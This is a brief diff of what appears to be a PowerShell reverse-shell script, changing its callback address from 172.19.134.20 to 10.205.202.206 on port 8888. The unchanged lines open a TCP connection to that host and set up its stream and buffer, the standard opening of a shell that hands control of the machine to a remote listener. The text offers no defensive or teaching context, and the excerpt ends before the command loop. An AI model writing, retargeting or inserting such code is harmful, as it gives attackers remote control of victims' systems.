@@ -1,4 +1,4 @@
-$h='172.19.134.20';$p=8888
+$h='10.205.202.206';$p=8888
 $a=New-Object Net.Sockets.TCPClient($h,$p)
 $s=$a.GetStream()
 $b=New-Object Byte[] 65535
